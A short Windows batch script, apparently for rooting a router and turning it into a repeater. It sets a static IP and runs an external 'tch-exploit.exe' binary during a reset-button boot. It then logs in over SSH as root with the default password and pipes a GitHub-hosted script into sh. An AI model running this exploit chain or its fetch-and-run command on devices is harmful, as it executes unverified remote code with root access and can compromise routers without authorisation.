@echo off
title THE CYBER ANAS - UNIVERSAL AUTOMATIC UNLOCK
setlocal enabledelayedexpansion

echo ======================================================
echo    THE CYBER ANAS - AUTOMATIC ROUTER DOMINATION
echo ======================================================
echo.

:: 1. AUTO-CONFIGURAZIONE RETE
echo [+] Configurazione automatica IP 58.162.0.1...
netsh interface ip set address name="Ethernet" static 58.162.0.1 255.255.255.0 >nul
if %errorlevel% neq 0 (
    echo [!] ERRORE: Esegui come Amministratore o rinomina la scheda in 'Ethernet'
    pause
    exit
)
echo [OK] Rete configurata.

:: 2. LANCIO EXPLOIT
echo [+] Avvio motore Exploit...
echo [!] ORA: Tieni RESET premuto e accendi il router.
echo [!] Rilascia SOLO quando vedi scorrere i dati nel programma.
echo.
if exist tch-exploit.exe (
    tch-exploit.exe
) else (
    echo [!] ERRORE: tch-exploit.exe non trovato nella cartella!
    pause
    exit
)

:: 3. AUTOMAZIONE SSH (Dopo il testo verde)
echo.
echo [+] TESTO VERDE RILEVATO? Premere un tasto per iniettare la GUI e il Ripetitore.
pause
echo [+] Invio comandi di configurazione Ripetitore...
:: Qui usiamo Plink (parte di PuTTY) per mandare i comandi in automatico
plink.exe -batch root@192.168.1.1 -pw root "curl -kLs https://raw.githubusercontent.com/TheCyberAnas/unlock/main/setup.sh | sh"

echo.
echo ======================================================
echo    OPERAZIONE COMPLETATA! IL ROUTER E' ORA UN RIPETITORE.
echo ======================================================
pause
